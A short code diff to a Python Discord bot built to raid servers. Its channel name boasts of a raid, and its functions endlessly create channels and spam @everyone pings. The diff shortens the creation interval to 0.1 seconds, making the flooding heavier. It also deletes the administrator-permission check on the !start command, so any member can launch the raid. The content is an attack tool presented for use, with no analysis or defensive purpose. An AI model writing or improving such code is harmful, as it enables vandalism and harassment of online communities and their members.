@@ -13,7 +13,7 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 
 SERVER_NAME = "トイ神の植民地"
 CHANNEL_NAME = "ここはトイ神の集い|TISNに荒らされました😂"
-CREATE_INTERVAL = 0.5  # チャンネル作成間隔（秒）
+CREATE_INTERVAL = 0.1  # チャンネル作成間隔（秒）
 
 COMBINED_TEXT = (
     "@everyone\n"
@@ -103,9 +103,6 @@ async def infinite_create_and_spam(guild: discord.Guild):
 
 @bot.command()
 async def start(ctx):
-    if not ctx.author.guild_permissions.administrator:
-        await ctx.send("⚠️ 管理者権限が必要です")
-        return
     if stop_flag.is_set() is False and len(background_tasks) > 0:
         await ctx.send("⚠️ 既に実行中です。停止するには !stop を実行してください")
         return
